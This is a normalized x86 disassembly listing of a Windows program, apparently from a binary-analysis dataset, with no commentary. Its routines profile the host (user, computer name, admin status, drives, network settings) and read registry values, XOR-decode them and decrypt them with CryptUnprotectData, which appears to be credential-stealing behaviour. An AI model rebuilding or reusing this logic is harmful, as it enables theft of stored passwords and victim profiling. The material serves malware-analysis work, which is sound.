sub_401020
push ebp
mov ebp esp
mov eax 0x2728
call sub_40f8bc
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40eb9e
push 0x270f
lea eax [ ebp - 0x2727 ]
push 0x0
push eax
mov [ ebp - 0x2728 ] 0x0
call sub_41112d
add esp 0xc
push 0x2710
lea eax [ ebp - 0x2728 ]
push eax
push 0x0
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x2728 ]
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40ec7e
lea ecx [ ebp - 0x18 ]
call sub_40ed8a
leave
retn
sub_4010b1
push ebp
mov ebp esp
sub esp 0x1c
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x1c ]
call sub_40eb9e
lea eax [ ebp - 0x4 ]
push eax
push r--data
push r--data
push 0x80000002
call sub_40c03c
add esp 0x10
test eax eax
je r-xdata
lea ecx [ ebp - 0x1c ]
call sub_40ed8a
leave
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x1c ]
call sub_40ec7e
push [ ebp - 0x4 ]
call sub_410a7a
pop ecx
sub_40112f
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x384
push ebx
push esi
push edi
call sub_401020
call sub_4010b1
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40eb9e
push 0x400
call sub_411160
mov ebx eax
pop ecx
lea eax [ ebp - 0x60 ]
push eax
call [ GetSystemInfo@IAT ]
mov al [ ebp - 0x4c ]
push ebx
push 0x1
sub esp 0x10
add al 0x30
mov ecx esp
push r--data
mov [ ebx ] al
mov [ ebx + 0x1 ] 0x0
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
push 0xb
pop ecx
mov esi r--data
lea edi [ ebp - 0x3c ]
[ edi ] [ esi ]
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x3c ]
movsb [ edi ] [ esi ]
push eax
mov esi 0x80000002
push esi
call sub_40c03c
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x3c ]
push eax
push esi
call sub_40c03c
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x3c ]
push eax
push esi
call sub_40c03c
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x3c ]
push eax
push esi
call sub_40c03c
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x3c ]
push eax
push esi
call sub_40c03c
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x3c ]
push eax
push esi
call sub_40c03c
add esp 0x10
push [ ebp + 0x74 ]
push [ ebp + 0x74 ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
and [ ebp + 0x68 ] 0x0
call [ GetLogicalDrives@IAT ]
and [ ebp + 0x40 ] 0x0
test eax eax
mov [ ebp + 0x28 ] eax
mov edi r--data
jbe r-xdata
mov [ rw-data ] 0x1
test [ ebp + 0x28 ] 0x1
je r-xdata
lea eax [ ebp + 0x73 ]
push eax
push 0x1
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
lea eax [ ebp + 0x64 ]
push eax
push ebx
mov [ ebp + 0x64 ] 0x3e8
call [ GetComputerNameA@IAT ]
sub esp 0x10
mov eax esp
push [ ebp + 0x64 ]
push ebx
push eax
call sub_40c364
add esp 0xc
lea eax [ ebp + 0x1b ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_40f80b
lea ecx [ ebp + 0x1b ]
call sub_40f609
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
push 0x248
push 0x40
call [ GlobalAlloc@IAT ]
lea ecx [ ebp + 0x48 ]
push ecx
push eax
mov [ ebp + 0x6c ] eax
mov [ ebp + 0x48 ] 0x248
call GetNetworkParams
test eax eax
jne r-xdata
mov [ ebp + 0x73 ] 0x31
inc [ ebp + 0x40 ]
shr [ ebp + 0x28 ] 0x1
jne r-xdata
mov al [ ebp + 0x40 ]
add al 0x41
push ebx
push ebx
mov [ ebx ] al
mov [ ebx + 0x1 ] 0x3a
mov [ ebx + 0x2 ] 0x5c
mov [ ebx + 0x3 ] 0x0
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
xor eax eax
push ebx
mov [ ebp + 0x2c ] eax
mov [ ebp + 0x44 ] eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x6c ] eax
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ ebp + 0x48 ] eax
je r-xdata
push r--data
push ebx
call sub_4115cd
cmp [ rw-data ] 0x0
pop ecx
pop ecx
jne r-xdata
push [ ebp + 0x6c ]
push [ ebp + 0x6c ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
mov eax [ ebp + 0x6c ]
add eax 0x84
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
mov eax [ ebp + 0x6c ]
add eax 0x110
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
mov eax [ ebp + 0x6c ]
mov eax [ eax + 0x10c ]
test eax eax
mov [ ebp + 0x68 ] eax
je r-xdata
cmp [ ebp + 0x68 ] 0x2800
jae r-xdata
mov eax [ ebp + 0x6c ]
imul eax [ ebp + 0x2c ]
shr eax 0xa
imul eax [ ebp + 0x44 ]
shr eax 0xa
push eax
push edi
push ebx
call sub_4115cd
add esp 0xc
push ebx
push ebx
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
mov eax [ ebp + 0x48 ]
dec eax
dec eax
je r-xdata
lea eax [ ebp + 0x6c ]
push eax
lea eax [ ebp + 0x4 ]
push eax
lea eax [ ebp + 0x44 ]
push eax
lea eax [ ebp + 0x2c ]
push eax
push ebx
call [ GetDiskFreeSpaceA@IAT ]
push ebx
push ebx
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
push ebx
call [ GetKeyboardLayoutNameA@IAT ]
push ebx
call sub_411738
push eax
lea eax [ ebp + 0x30 ]
push ebx
push eax
call sub_40c364
add esp 0x10
push [ ebp + 0x34 ]
push [ ebp + 0x38 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
call [ GetACP@IAT ]
push eax
push r--data
push ebx
call sub_4115cd
add esp 0xc
push ebx
push ebx
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
call [ GetOEMCP@IAT ]
push eax
push r--data
push ebx
call sub_4115cd
add esp 0xc
push ebx
push ebx
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
lea eax [ ebp + 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x3c ]
push eax
push esi
call sub_40c03c
push [ ebp + 0x74 ]
call sub_411738
pop ecx
mov ecx esp
push eax
push [ ebp + 0x74 ]
push ecx
call sub_40c364
add esp 0xc
lea eax [ ebp + 0x1b ]
push eax
lea ecx [ ebp + 0x30 ]
call sub_40f80b
lea ecx [ ebp + 0x1b ]
call sub_40f609
push [ ebp + 0x34 ]
push [ ebp + 0x38 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
push ebx
mov esi 0x400
push esi
call [ GetCurrentDirectoryA@IAT ]
push ebx
call sub_411738
sub esp 0xc
mov ecx esp
push eax
push ebx
push ecx
call sub_40c364
add esp 0xc
lea eax [ ebp + 0x1b ]
push eax
lea ecx [ ebp + 0x30 ]
call sub_40f80b
lea ecx [ ebp + 0x1b ]
call sub_40f609
push [ ebp + 0x34 ]
push [ ebp + 0x38 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
push ebx
push esi
call [ GetTempPathA@IAT ]
push ebx
call sub_411738
sub esp 0xc
mov ecx esp
push eax
push ebx
push ecx
call sub_40c364
add esp 0xc
lea eax [ ebp + 0x1b ]
push eax
lea ecx [ ebp + 0x30 ]
call sub_40f80b
lea ecx [ ebp + 0x1b ]
call sub_40f609
push [ ebp + 0x34 ]
push [ ebp + 0x38 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
mov esi [ GetSystemMetrics@IAT ]
push 0x0
call esi
push eax
push edi
push ebx
call sub_4115cd
add esp 0xc
push ebx
push ebx
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
push 0x1
call esi
push eax
push edi
push ebx
call sub_4115cd
add esp 0xc
push ebx
push ebx
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
lea eax [ ebp - 0x17c ]
push eax
push 0xffffffff
push 0x0
call [ EnumDisplaySettingsA@IAT ]
push [ ebp - 0x114 ]
push edi
push ebx
call sub_4115cd
add esp 0xc
push ebx
push ebx
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
push ebx
call sub_410a7a
pop ecx
lea ecx [ ebp + 0x30 ]
call sub_40f609
lea ecx [ ebp + 0x8 ]
call sub_40f609
lea ecx [ ebp + 0x4c ]
call sub_40ed8a
pop edi
pop esi
pop ebx
add ebp 0x78
leave
retn
lea eax [ ebp - 0x30c ]
push eax
push 0x101
call WSAStartup
test eax eax
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTime@IAT ]
movzx eax [ ebp ]
push eax
movzx eax [ ebp - 0x2 ]
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
push r--data
push ebx
call sub_4115cd
add esp 0x20
push ebx
push ebx
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
lea eax [ ebp + 0x64 ]
push eax
push ebx
mov [ ebp + 0x64 ] 0x3e8
call [ GetUserNameA@IAT ]
push [ ebp + 0x64 ]
lea eax [ ebp + 0x8 ]
push ebx
push eax
call sub_40c364
add esp 0xc
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
call [ IsUserAnAdmin@IAT ]
add al 0x30
push r--data
push ebx
mov [ ebp + 0x73 ] al
call sub_41188f
test eax eax
pop ecx
pop ecx
je r-xdata
push r--data
dec eax
je r-xdata
push 0x80
lea eax [ ebp - 0xe0 ]
push eax
call gethostname
test eax eax
jne r-xdata
add eax 0x4
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
mov eax [ ebp + 0x68 ]
mov eax [ eax ]
test eax eax
mov [ ebp + 0x68 ] eax
jne r-xdata
push r--data
push ebx
call sub_4115cd
mov eax [ ebp + 0x6c ]
imul eax [ ebp + 0x2c ]
shr eax 0xa
imul eax [ ebp + 0x44 ]
shr eax 0xa
add [ ebp + 0x68 ] eax
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0xe0 ]
push eax
call gethostbyname
test eax eax
je r-xdata
mov eax [ ebp + 0x68 ]
pop ecx
pop ecx
push ebx
push ebx
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x4c ]
call sub_40ec7e
push r--data
jmp r-xdata
dec eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call inet_ntoa
push eax
push r--data
push ebx
call sub_4115cd
add esp 0xc
push ebx
call sub_4115cd
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
sub_401975
push ebp
mov ebp esp
mov eax 0x7850
call sub_40f8bc
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x50 ]
call sub_40eb9e
call sub_40f095
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] esp
mov [ ebp - 0x18 ] ebp
lea eax [ ebp - 0x8 ]
push eax
call sub_40f06f
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
mov [ ebp - 0x30 ] eax
push [ fs : 0x0 ]
pop [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] sub_40f09c
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x80000001
mov [ ebp - 0x10 ] 0x400
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
lea ecx [ ebp - 0x50 ]
call sub_40ed8a
pop edi
pop esi
pop ebx
leave
retn
mov edi [ RegEnumKeyA@IAT ]
mov ebx 0x2800
push ebx
lea eax [ ebp - 0x2850 ]
push eax
mov [ ebp - 0x20 ] 0x1
push 0x0
jmp r-xdata
push [ ebp - 0x4 ]
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x5050 ]
push r--data
push eax
call sub_4116d8
lea eax [ ebp - 0x2850 ]
push eax
lea eax [ ebp - 0x5050 ]
push eax
call sub_411657
lea eax [ ebp - 0x5050 ]
push r--data
push eax
call sub_411657
add esp 0x18
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x5050 ]
push eax
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0xc ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x20 ]
inc [ ebp - 0x20 ]
push ebx
lea ecx [ ebp - 0x2850 ]
push ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x7850 ]
push eax
push 0x0
push 0x0
push r--data
push [ ebp - 0xc ]
call [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x5050 ]
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x50 ]
call sub_40ec7e
lea eax [ ebp - 0x7850 ]
push r--data
push eax
call sub_410c4c
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push 0x2
push 0x0
push esi
call sub_410e24
push esi
call sub_410e80
push 0x0
push 0x0
push esi
mov [ ebp - 0x1c ] eax
call sub_410e24
push [ ebp - 0x1c ]
call sub_411160
push esi
push [ ebp - 0x1c ]
mov [ ebp - 0x24 ] eax
push 0x1
push eax
call sub_410d0d
add esp 0x30
push [ ebp - 0x24 ]
push [ ebp - 0x1c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x50 ]
call sub_40ec7e
push [ ebp - 0x24 ]
call sub_410a7a
push esi
call sub_410b53
pop ecx
pop ecx
sub_401b89
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_411738
pop ecx
mov cl [ esi + 0x1 ]
xor cl [ esi ]
inc eax
or cl 0x50
push 0x2
mov [ esi ] cl
dec eax
pop ecx
cmp eax ecx
jle r-xdata
lea eax [ esi + 0x2 ]
pop esi
retn
mov dl [ esi ]
xor [ ecx + esi ] dl
inc ecx
cmp ecx eax
jl r-xdata
sub_401bb7
push ebp
mov ebp esp
sub esp 0xb7c
push ebx
push esi
push edi
xor ebx ebx
push 0x7fe
lea eax [ ebp - 0xb7a ]
push ebx
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xb7c ] bx
call sub_41112d
add esp 0xc
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
mov [ ebp - 0x4 ] 0xff
call sub_40f45c
lea ecx [ ebp - 0x38 ]
call sub_40eb9e
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push r--data
push 0x80000001
call [ RegOpenKeyA@IAT ]
mov [ ebp + 0x8 ] 0x31
jmp r-xdata
lea ecx [ ebp - 0x38 ]
call sub_40ed8a
or eax 0xffffffff
lea eax [ ebp - 0x8 ]
push eax
push r--data
push 0x80000001
call [ RegOpenKeyA@IAT ]
mov [ ebp + 0x8 ] 0x32
cmp eax ebx
jne r-xdata
lea ecx [ ebp - 0x38 ]
call sub_40ed8a
xor eax eax
jmp r-xdata
lea eax [ ebp + 0x8 ]
push eax
push 0x1
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x38 ]
call sub_40ec7e
mov esi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x174 ]
push eax
push ebx
push ebx
push r--data
push [ ebp - 0x8 ]
call esi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x800
lea eax [ ebp - 0xb7c ]
push eax
push ebx
push [ ebp - 0x8 ]
call [ RegEnumKeyA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x174 ]
push eax
call sub_401b89
push eax
mov [ ebp + 0x8 ] eax
call sub_411738
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_40c364
add esp 0x14
push [ ebp - 0x44 ]
push [ ebp - 0x40 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x38 ]
call sub_40ec7e
lea ecx [ ebp - 0x48 ]
call sub_40f609
mov edi 0x104
inc [ ebp - 0x10 ]
push 0x800
lea eax [ ebp - 0xb7c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
call [ RegEnumKeyA@IAT ]
test eax eax
je r-xdata
push edi
lea eax [ ebp - 0x37c ]
push ebx
push eax
call sub_41112d
push edi
lea eax [ ebp - 0x278 ]
push ebx
push eax
call sub_41112d
push edi
lea eax [ ebp - 0x174 ]
push ebx
push eax
call sub_41112d
add esp 0x24
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x37c ]
push eax
push ebx
push ebx
push r--data
push [ ebp - 0xc ]
mov [ ebp - 0x4 ] 0xff
call esi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x278 ]
push eax
push ebx
push ebx
push r--data
push [ ebp - 0xc ]
mov [ ebp - 0x4 ] 0xff
call esi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x174 ]
push eax
push ebx
push ebx
push r--data
push [ ebp - 0xc ]
mov [ ebp - 0x4 ] 0xff
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0xb7c ]
push eax
push [ ebp - 0x8 ]
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xb7c ]
push eax
call sub_411738
push eax
lea eax [ ebp - 0xb7c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_40c364
add esp 0x10
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x38 ]
call sub_40ec7e
lea eax [ ebp - 0x37c ]
push eax
call sub_411738
sub esp 0xc
mov ecx esp
push eax
lea eax [ ebp - 0x37c ]
push eax
push ecx
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x55 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40f80b
lea ecx [ ebp - 0x55 ]
call sub_40f609
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x38 ]
call sub_40ec7e
lea eax [ ebp - 0x278 ]
push eax
call sub_411738
sub esp 0xc
mov ecx esp
push eax
lea eax [ ebp - 0x278 ]
push eax
push ecx
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x6f ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40f80b
lea ecx [ ebp - 0x6f ]
call sub_40f609
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x38 ]
call sub_40ec7e
push [ ebp + 0x8 ]
call sub_411738
sub esp 0xc
mov ecx esp
push eax
push [ ebp + 0x8 ]
push ecx
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x62 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40f80b
lea ecx [ ebp - 0x62 ]
call sub_40f609
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x38 ]
call sub_40ec7e
push [ ebp - 0xc ]
call [ RegCloseKey@IAT ]
lea ecx [ ebp - 0x20 ]
call sub_40f609
lea eax [ ebp - 0x174 ]
push eax
call sub_401b89
pop ecx
mov [ ebp + 0x8 ] eax
sub_401f35
push ebp
mov ebp esp
sub esp 0x20
call sub_40f095
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] esp
mov [ ebp - 0xc ] ebp
lea eax [ ebp - 0x4 ]
push eax
call sub_40f06f
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
mov [ ebp - 0x18 ] eax
push [ fs : 0x0 ]
pop [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] sub_40f09c
lea eax [ ebp - 0x20 ]
mov [ fs : 0x0 ] eax
push 0x1
call sub_401bb7
push 0x2
call sub_401bb7
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ fs : 0x0 ] eax
leave
retn
sub_401fa0
push ebp
mov ebp esp
sub esp 0x658
push ebx
push esi
push edi
mov edi 0xfc
xor ebx ebx
push edi
lea eax [ ebp - 0x55c ]
push ebx
push eax
mov [ ebp - 0x460 ] bl
call sub_41112d
mov esi 0x200
push esi
lea eax [ ebp - 0x460 ]
push ebx
push eax
call sub_41112d
push esi
lea eax [ ebp - 0x260 ]
push ebx
push eax
mov [ ebp - 0x260 ] bl
call sub_41112d
push edi
lea eax [ ebp - 0x658 ]
push ebx
push eax
call sub_41112d
push 0x40
lea eax [ ebp - 0x60 ]
push ebx
push eax
call sub_41112d
push r--data
mov [ ebp - 0x60 ] 0x69f31ea3
mov [ ebp - 0x5c ] 0x1fd96207
mov [ ebp - 0x58 ] 0x7d35e91e
mov [ ebp - 0x54 ] 0x487dd24f
call sub_410ec4
add esp 0x40
push eax
lea eax [ ebp - 0x460 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x460 ]
push eax
call sub_411738
push r--data
mov [ ebp - 0x8 ] eax
call sub_410ec4
push eax
lea eax [ ebp - 0x260 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x260 ]
push eax
call sub_411738
add esp 0x1c
xor edi edi
cmp [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] eax
mov ecx 0xba0da71d
jbe r-xdata
xor eax eax
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
movsx edx [ ebp + edi - 0x460 ]
imul edx ecx
imul ecx ecx 0xbc8f
mov eax edi
and eax 0x3
lea esi [ ebp + eax * 4 - 0x60 ]
xor [ esi ] edx
inc edi
cmp edi [ ebp - 0x8 ]
jb r-xdata
mov eax [ ebp - 0x60 ]
mov esi [ ebp + 0x8 ]
or eax 0x1
xor ecx ecx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
movsx edx [ ebp + eax - 0x260 ]
imul edx ecx
imul ecx ecx 0xbc8f
mov esi edi
and esi 0x3
lea esi [ ebp + esi * 4 - 0x60 ]
xor [ esi ] edx
inc edi
inc eax
cmp eax [ ebp - 0x4 ]
jb r-xdata
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push ebx
push ebx
lea eax [ ebp - 0x20 ]
push eax
shr ecx 0x1
mov [ ecx + esi + 0x4 ] bl
push ebx
lea eax [ ebp - 0x18 ]
add ecx 0xfffffffd
push eax
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x20 ] 0x10
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
mov dl [ esi + ecx + 0x4 ]
mov bl [ esi + ecx + 0x5 ]
dec dl
shl dl 0x4
sub bl 0x21
movzx edx dl
movzx edi bl
or edx edi
movzx edi al
imul eax eax 0x10ff5
sub edx edi
mov edi ecx
shr edi 0x1
inc ecx
inc ecx
cmp ecx [ ebp + 0xc ]
mov [ edi + esi ] dl
jb r-xdata
xor eax eax
push [ ebp - 0x10 ]
mov esi [ ebp + 0x10 ]
push [ ebp - 0xc ]
push esi
call sub_4110cf
mov eax [ ebp - 0x10 ]
add esp 0xc
mov [ eax + esi ] bl
push [ ebp - 0xc ]
call [ LocalFree@IAT ]
xor eax eax
inc eax
jmp r-xdata
xor ebx ebx
pop edi
pop esi
pop ebx
leave
retn
sub_402175
push ebp
mov ebp esp
sub esp 0xa50
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x40 ]
call sub_40eb9e
mov ebx [ RegOpenKeyExA@IAT ]
lea eax [ ebp - 0xc ]
push eax
push 0x9
xor edi edi
push edi
push r--data
push 0x80000001
call ebx
test eax eax
jne r-xdata
lea ecx [ ebp - 0x40 ]
call sub_40ed8a
pop edi
pop esi
pop ebx
leave
retn
call sub_40bb9f
push edi
push edi
push edi
push edi
push edi
push edi
push edi
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push edi
push [ ebp - 0xc ]
mov [ ebp - 0x4 ] edi
call [ RegQueryInfoKeyA@IAT ]
cmp [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] edi
je r-xdata
push [ ebp - 0xc ]
call [ RegCloseKey@IAT ]
call sub_40bdbc
mov esi 0x200
mov eax [ ebp - 0x10 ]
inc eax
cmp eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
jb r-xdata
lea eax [ ebp - 0x250 ]
push eax
lea eax [ ebp - 0x650 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
push 0x20019
push edi
lea eax [ ebp - 0x650 ]
push eax
push 0x80000001
mov [ ebp - 0x8 ] esi
call ebx
cmp eax edi
jne r-xdata
push esi
lea eax [ ebp - 0x250 ]
push edi
push eax
mov [ ebp - 0x14 ] edi
call sub_41112d
push esi
lea eax [ ebp - 0x650 ]
push edi
push eax
call sub_41112d
push 0x400
lea eax [ ebp - 0xa50 ]
push edi
push eax
call sub_41112d
push esi
